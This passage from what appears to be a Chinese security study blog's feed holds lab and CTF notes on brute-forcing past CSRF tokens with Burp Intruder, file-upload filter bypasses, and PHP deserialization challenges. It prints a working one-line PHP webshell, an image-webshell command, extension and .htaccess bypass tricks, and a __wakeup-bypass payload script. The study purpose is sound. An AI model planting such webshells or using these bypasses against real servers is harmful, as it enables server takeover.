    <content type="html"><![CDATA[<h1 id="token绕过"><a href="#token绕过" class="headerlink" title="token绕过"></a>token绕过</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li><p>知识点：</p><p>token 验证：客户端每次请求服务器时，服务器会返回一个 token，下次请求时，客户端需要带上这个 token，否则服务器认为请求不合法。且这个 token 不可重复使用，每次请求都将生成新的 token，并导致旧的 token 失效。</p></li></ul><span id="more"></span><ul><li><p>实例：</p><p>pikachu渗透测试平台–暴力破解–token防爆破</p></li></ul><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>使用burp抓包，可以注意到post请求携带参数token。repeater重复发送第二次就会发现出现“csrf token error”的提示符。</p><p><img src="/../img/goLb2NI5PfKUZCD.png" alt="image-20231003005919263"></p><p>每次请求，token都会改变，而这个下一次请求的token值从每次的response中可以得到。</p><p>具体：在response中搜索token找到有一个type为“hidden“的input标签，可以发现其value正是下一次的token值。</p><img src="https://s2.loli.net/2023/10/03/YOcp3Tw5ksz2NRS.png" alt="image-20231003010510211" style="zoom:60%;" /><h3 id="具体实施-with-Intruder"><a href="#具体实施-with-Intruder" class="headerlink" title="具体实施- with Intruder"></a>具体实施- with Intruder</h3><p>利用burp抓包转入intruder模块，设置两个变量：password和token。选择<strong>pitchfork</strong>模式（为什么不设置username也为变量：这里已经默认自己知道username为admin了。然后选取pitchfork是因为token每个只能使用一次，其实是有不妥：如果在不知道username的情况下，设置三个变量，username和password的list就要额外设计，因为使用不重复的list就会错过很多username和password的组合，而这都是因为<strong>一一对应</strong>）</p><p><img src="https://s2.loli.net/2023/10/03/oP4JavFzq3NwxcY.png" alt="image-20231003011542400"></p><p>然后设置payload。重点在于设置token变量的payload时需要选择为<strong>recursive grep</strong></p><p><img src="https://s2.loli.net/2023/10/03/PfAgn5hc78pt2xQ.png" alt="image-20231003012417416"></p><p>然后在intruder的setting部分找到grep-extract部分</p><img src="https://s2.loli.net/2023/10/03/wC1oJyc5SMjgEAL.png" alt="image-20231003012916995" style="zoom: 33%;" /><p>点击add：</p><img src="https://s2.loli.net/2023/10/03/zRYIEVKTcWXbfC4.png" alt="image-20231003013125589" style="zoom: 53%;" /><p>下框中若无内容则点击fetch response&#x2F;refetch response</p><img src="https://s2.loli.net/2023/10/03/Fw7OLCruMJWxsgd.png" alt="image-20231003013146189" style="zoom: 40%;" /><p>之后利用search框找到token，则会自动生成正则，然后选择ok填入。</p><img src="https://s2.loli.net/2023/10/03/xVR9ELwoI4gycF7.png" alt="image-20231003013417675" style="zoom:40%;" /><p>之后还得设置线程数量为1</p><img src="https://s2.loli.net/2023/10/03/sbfiAc3xZt7DlH4.png" alt="image-20231003013601503" style="zoom: 50%;" /><p>一切就绪之后开始爆破，可以看到payload2确实加载成功了，而其中的正确的response也显示login success</p><p><img src="https://s2.loli.net/2023/10/03/xm9VFlWYhkRo6sI.png"></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2023/09/27/ctf-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/09/27/ctf-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞概述"><a href="#文件上传漏洞概述" class="headerlink" title="文件上传漏洞概述"></a>文件上传漏洞概述</h2><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>application&#x2F;x-www-form-urlencoded</td><td>默认，在发送前对所有字符进行编码（将空格转换成”+“符号，特殊字符转成ASCII HEX值）。将表单中的数据变为键值对的形式如果action为get，则将表单中的数据转换成一个字符串(name1&#x3D;value1&amp;name2&#x3D;value2)，然后把这个字符串附加到URL后面，并用?分割如果action为post，浏览器把form数据封装到http body中，然后发送到服务器</td></tr><tr><td>multipart&#x2F;form-data</td><td>不对字符编码。当表单中有<strong>文件上传</strong>控件时该值是必须的。专门用来传输特殊类型数据的，比如文件，会将表单中的数据变成二进制数据，这时候如果用request是无法获取到相应表单的值，应通过<strong>stream流</strong>对象，将传到服务器端的二进制数据解码，从而读取数据</td></tr><tr><td>text&#x2F;plain</td><td>将空格转换成”+“符号，但不编码特殊字符。表单以纯文本形式进行编码</td></tr></tbody></table><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>webshell就是以 asp、aspx、php、jsp 或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp、aspx、php或jsp后门文件与网站web服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问该后门文件了，从而得到一个命令执行环境，以达到控制网站服务器的目的。</p><p>最普遍的一句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其中eval就是执行命令的函数，$_POST[‘shell’]就是接收的数据。eval函数把接收的数据当作php代码来执行。这样我们就能够让插了一句话木马的网站执行我们传递过去的任意php语句。这便是一句话木马的强大之处。</p><h2 id="文件上传检测与绕过"><a href="#文件上传检测与绕过" class="headerlink" title="文件上传检测与绕过"></a>文件上传检测与绕过</h2><h3 id="前端检测与绕过"><a href="#前端检测与绕过" class="headerlink" title="前端检测与绕过"></a>前端检测与绕过</h3><p>burp抓包改文件名</p><h3 id="服务端检测与绕过"><a href="#服务端检测与绕过" class="headerlink" title="服务端检测与绕过"></a>服务端检测与绕过</h3><h4 id="后缀名检测与绕过"><a href="#后缀名检测与绕过" class="headerlink" title="后缀名检测与绕过"></a>后缀名检测与绕过</h4><ol><li>黑名单列表绕过</li></ol><p>如果黑名单规则不严谨，在某些特定的环境中，某些特殊的后缀名仍然会被当做php文件解析。</p><p>不同后缀：Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml</p><p>也可尝试大小写绕过：</p><p>windows对大小写不敏感，linux对大小写敏感</p><ol start="2"><li>windows特性</li></ol><p>windows会自动去掉后面添加的</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.php</span>.<br><br><span class="hljs-number">1</span><span class="hljs-selector-class">.php</span> (空格)<br><br><span class="hljs-number">1</span><span class="hljs-selector-class">.php</span>::<span class="hljs-variable">$DATA</span><br></code></pre></td></tr></table></figure><ol start="3"><li>.htaccess文件攻击</li></ol><p>原理： </p><ul><li>.htaccess 文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。<strong>管理员可以通过 Apache 的 AllowOverride 指令来设置</strong>（该参数在httpd.conf中进行设置）。 </li><li>htaccess 中有 # 单行注释符, 且支持 \拼接上下两行</li></ul><p>以下为匹配文件名的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs .htaccess">&lt;FilesMatch &quot;1.jpg&quot;&gt;    <br>SetHandler application/x-httpd-php <br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><ol start="4"><li>结合apache文件解析机制，从右到左开始解析文件后缀，若文件名不可识别，则继续判断直到遇到可解析的后缀为止。</li></ol><p><code>1.php.xxx</code></p><p>其实,apache本身根本不存在所谓的解析漏洞.<br>我们回顾一下请求的过程（1.php.xxx.yyy）:<br>yyy -&gt;无法识别,向左<br>xxx -&gt;无法识别,向左<br>php -&gt;发现后缀是php，交给php处理这个文件<br>最后一步虽然交给了php来处理这个文件，但是php也不认识.yyy的后缀啊，所以就直接输出了。</p><p>解析漏洞的产生，是由于运维人员在配置服务器时，为了使apache服务器能解析php，而自己添加一个handler，例如：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddHandler <span class="hljs-built_in">application</span>/x-httpd-php.php<br></code></pre></td></tr></table></figure><p>它的作用也是为了让apache把php文件交给phpmodule解析，但是注意到它与SetHandler:它的后缀不是用正则去匹配的。所以,在文件名的任何位置匹配到php后缀，它都会让php_module解析。</p><p>修复方法<br>不要使用AddHandler,改用SetHandler,写好正则,就不会有解析问题，</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">&lt;FilesMatch <span class="hljs-string">&quot;.+ \.php$&quot;</span>&gt;<br>SetHandler application/x-httpd-php<br>&lt;<span class="hljs-string">/FilesMatch</span>&gt;<br>禁止<span class="hljs-string">.php.</span>这样的文件执行，<br>&lt;FilesMatch<span class="hljs-string">&quot;.+\.ph(p[3457]?|t|tml)\.&quot;</span>&gt;<br>Require all denied<br>&lt;<span class="hljs-string">/FilesMatch</span>&gt;<br></code></pre></td></tr></table></figure><ol start="5"><li>IIS解析漏洞</li></ol><p><strong>IlS 6.0</strong>在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。这—漏洞有两种完全不同的利用方式:<br>&#x2F;test.asp&#x2F;test.jpg<br>test.asp;.jpg</p><h4 id="MIME类型检测与绕过"><a href="#MIME类型检测与绕过" class="headerlink" title="MIME类型检测与绕过"></a>MIME类型检测与绕过</h4><p>Content-Type字段表示文件的MIME类型。</p><p>注意该字段的值即可。</p><h4 id="文件内容检测与绕过"><a href="#文件内容检测与绕过" class="headerlink" title="文件内容检测与绕过"></a>文件内容检测与绕过</h4><p>一个方法是：上传一张图片，然后在尾部加上一句话木马（同样使用burpsuite）。问题:在传入一张正常图片，然后在burp里面拦截并尾部加上一句话木马后，显示上传成功，但是却无法读取，在前端访问显示error；最后删去了很长一段图片内容，再次上传，可以成功连接；</p><p>还有一方法为直接制作图片马：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ copy 1.jpg/b +1.php/a 2.jpg<br></code></pre></td></tr></table></figure><p>实验：</p><p>将上传的一句话木马文件改名绕过前端：</p><p>muma.php—&gt;muma.jpeg</p><p><img src="https://s2.loli.net/2023/09/22/gpfAxnuyeXzh32j.png" alt="image-20230922102923688"></p><p>burp抓包，改回php后缀名，并且加上GIF89a(gif的文件头)</p><p><img src="https://s2.loli.net/2023/09/22/2glOqDAMapuYI4P.png" alt="image-20230922102655658"></p><p>但是试了GIF8, 也可以上传成功</p><p><img src="https://s2.loli.net/2023/09/22/3vlMOEcDTFUymb5.png" alt="image-20230922111052350"></p><p><img src="https://s2.loli.net/2023/10/26/mnCRELWgDAZNO5d.png" alt="image-20230922111145578"></p><p>GIF8—47494638  已经是文件头了 </p><p>常见图片文件头：</p><table><thead><tr><th>文件类型</th><th>后缀</th><th>文件头</th><th>文件尾</th><th>标志</th></tr></thead><tbody><tr><td>JPEG</td><td>.jpg&#x2F;.jpeg</td><td>FFD8FF</td><td>FFD9</td><td>JFIF</td></tr><tr><td>PNG</td><td>.png</td><td>89504E47</td><td>AE426082</td><td>PNG IEND IHDR</td></tr><tr><td>GIF</td><td>.gif</td><td>47494638</td><td>003B</td><td>GIT9a</td></tr><tr><td>TIFF</td><td>.tif&#x2F;.tiff</td><td>49492A00</td><td>4D4D2A00</td><td>- II MM</td></tr></tbody></table><h4 id="00截断检测与绕过"><a href="#00截断检测与绕过" class="headerlink" title="00截断检测与绕过"></a>00截断检测与绕过</h4><p>截断条件：php版本小于5.3.4</p><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>以下为示例检测代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$name</span> = basename(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$blacklist</span> = array(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>);<br><span class="hljs-variable">$name</span> = str_ireplace(<span class="hljs-variable">$blacklist</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$name</span>);<br><span class="hljs-regexp">//</span>code from ctfhub<br></code></pre></td></tr></table></figure><h4 id="条件竞争检测与绕过"><a href="#条件竞争检测与绕过" class="headerlink" title="条件竞争检测与绕过"></a>条件竞争检测与绕过</h4><p>略</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/linfangnan/p/15784968.html">https://www.cnblogs.com/linfangnan/p/15784968.html</a></p><p><img src="https://s2.loli.net/2023/10/26/7fsbOxUGq4yHjwV.png" alt="2fc0902942b46dcad0a5b6a23f693363"></p>]]></content>
    
    
    <categories>
      
      <category>ctf-web</category>
      
      <category>渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ctf-web练习(php)</title>
    <link href="/2023/09/18/ctf-web-php/"/>
    <url>/2023/09/18/ctf-web-php/</url>
    
    <content type="html"><![CDATA[<h1 id="ctf-web练习-php-–待补充"><a href="#ctf-web练习-php-–待补充" class="headerlink" title="ctf-web练习(php)–待补充"></a>ctf-web练习(php)–待补充</h1><h2 id="php知识"><a href="#php知识" class="headerlink" title="php知识"></a>php知识</h2><h3 id="php的魔术方法"><a href="#php的魔术方法" class="headerlink" title="php的魔术方法"></a>php的魔术方法</h3><ul><li>__construct() 当一个对象创建时被调用 –构造函数</li><li>__destruct() 当一个对象销毁时被调用 –析构函数</li><li>__wakeup() 使用unserialize时触发</li><li>__sleep() 使用serialize时触发</li><li>__toString()  当一个对象被当做一个字符串时来使用</li></ul><h3 id="php的变量类型"><a href="#php的变量类型" class="headerlink" title="php的变量类型"></a>php的变量类型</h3><p>public：属性被序列化的时候属性值会变成 <code>属性名</code></p><p>protected：属性被序列化的时候属性值会变成 <code>\x00*\x00属性名</code></p><p>private：属性被序列化的时候属性值会变成 <code>\x00类名\x00属性名</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$gender</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-string">&#x27;Hardworking666&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;gender = <span class="hljs-string">&#x27;male&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-string">&#x27;18&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:6:&quot;People&quot;:3:&#123;s:2:&quot;id&quot;;s:14:&quot;Hardworking666&quot;;s:9:&quot; * gender&quot;;s:4:&quot;male&quot;;s:11:&quot; People age&quot;;s:2:&quot;18&quot;;&#125;</span><br><br></code></pre></td></tr></table></figure><p>注意：比如，$file 是私有成员，序列化之后字符串首尾会多出两个空格 “%00*%00”，如果有时候利用html网页复制值可能会出现问题。</p><h3 id="php序列化和反序列化"><a href="#php序列化和反序列化" class="headerlink" title="php序列化和反序列化"></a>php序列化和反序列化</h3><p>PHP序列化：serialize()</p><p>序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p><p>而PHP反序列化：unserialize()</p><p>反序列化是将字符串转换成变量或对象的过程。</p><p>从序列化到反序列化这几个函数的执行过程是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()` -&gt;`<span class="hljs-title function_ invoke__">__sleep</span>()` -&gt; `<span class="hljs-title function_ invoke__">__wakeup</span>()` -&gt; `<span class="hljs-title function_ invoke__">__toString</span>()` -&gt; `<span class="hljs-title function_ invoke__">__destruct</span>()<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TEST</span></span>&#123;  <br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$test1</span>=<span class="hljs-string">&quot;11&quot;</span>;  <br> <span class="hljs-keyword">private</span> <span class="hljs-variable">$test2</span>=<span class="hljs-string">&quot;22&quot;</span>;  <br> <span class="hljs-keyword">protected</span> <span class="hljs-variable">$test3</span>=<span class="hljs-string">&quot;33&quot;</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test4</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"> </span>&#123;  <br> <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test1;  <br> &#125;  <br>&#125;  <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">TEST</span>();  <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>); <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:4:&quot;TEST&quot;:3:&#123;s:5:&quot;test1&quot;;s:2:&quot;11&quot;;s:11:&quot;TESTtest2&quot;;s:2:&quot;22&quot;;s:8:&quot;*test3&quot;;s:2:&quot;33&quot;;&#125;</span><br><span class="hljs-comment">//O代表类，然后后面4代表类名长度，接着双引号内是类名</span><br><span class="hljs-comment">//然后是类中变量的个数：&#123;类型：长度:&quot;值&quot;；类型:长度:&quot;值&quot;...以此类推&#125;</span><br><span class="hljs-comment">//有时候为了避免private和protected导致一些字符不可打印，通常会urlencode一下</span><br><br></code></pre></td></tr></table></figure><h3 id="call-user-func-array函数"><a href="#call-user-func-array函数" class="headerlink" title="call_user_func_array函数"></a>call_user_func_array函数</h3><p>（1）普通使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span></span>) </span><br><span class="hljs-function"></span>&#123;  <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>; <br>&#125; <br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;111&quot;</span>, <span class="hljs-string">&quot;222&quot;</span>)); <br><span class="hljs-comment">//输出 111 222</span><br></code></pre></td></tr></table></figure><p>（2）调用类内部的方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">Class ClassA <br>&#123; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bc</span>(<span class="hljs-params"><span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span></span>)</span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-variable">$bc</span> = <span class="hljs-variable">$b</span> + <span class="hljs-variable">$c</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$bc</span>; <br>&#125; <br>&#125; <br><br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ClassA&#x27;</span>,<span class="hljs-string">&#x27;bc&#x27;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;111&quot;</span>, <span class="hljs-string">&quot;222&quot;</span>)); <br><span class="hljs-comment">//输出  333 </span><br></code></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/weihuiblog/article/details/78998924">https://blog.csdn.net/weihuiblog/article/details/78998924</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="1-ctf-web-“PHP2”"><a href="#1-ctf-web-“PHP2”" class="headerlink" title="1. ctf-web-“PHP2”"></a>1. ctf-web-“PHP2”</h3><ul><li><p>phps文件就是php的<strong>源代码文件</strong>，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用<strong>phps</strong>文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</p></li><li><p>运用后台扫描工具</p></li></ul><h3 id="2-ctf-web-unserialize3"><a href="#2-ctf-web-unserialize3" class="headerlink" title="2. ctf-web-unserialize3"></a>2. ctf-web-unserialize3</h3><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h5><p>PHP<strong>反序列化漏洞</strong>：执行unserialize()时，先会调用__wakeup()。</p><p>当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过__wakeup()。</p><p>（<strong>影响版本</strong>php5&lt;5.6.25,php7&lt;7.010）已经测试过，在本机php8.2中，并不会有该漏洞的出现。</p><h5 id="目的"><a href="#目的" class="headerlink" title="目的"></a><strong>目的</strong></h5><p>了解绕过常见的<strong>函数过滤</strong>机制</p><h3 id="3-Web-php-unserialize"><a href="#3-Web-php-unserialize" class="headerlink" title="3.Web_php_unserialize"></a>3.Web_php_unserialize</h3><p>类似于上题，只是多了一个正则过滤问题</p><p><img src="https://s2.loli.net/2023/09/25/vbW31rf7uKmqcSk.png" alt="image-20230925181847920"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><br>    <span class="hljs-variable">$A</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&#x27;fl4g.php&#x27;</span>);<br>    <span class="hljs-variable">$C</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$A</span>);<br>    <span class="hljs-comment">//string(49) &quot;O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&quot;</span><br>    <span class="hljs-variable">$C</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>, <span class="hljs-string">&#x27;O:+4&#x27;</span>,<span class="hljs-variable">$C</span>);<span class="hljs-comment">//绕过preg_match</span><br>    <span class="hljs-variable">$C</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>,<span class="hljs-variable">$C</span>);<span class="hljs-comment">//绕过wakeup</span><br><br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$C</span>));<br>   <br><br>    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>曾出现的问题：</p><p>$file 是私有成员序列化之后字符串首尾会多出两个空格 “%00*%00”，所以base64加密最好在代码中执行防止复制漏掉—-本人刚开始的解题思路便是启动服务器输出序列化后的字符串然后进行复制，再在代码中进入下一步操作，然后出现了问题。</p><h3 id="4-unseping"><a href="#4-unseping" class="headerlink" title="4.unseping"></a>4.unseping</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td 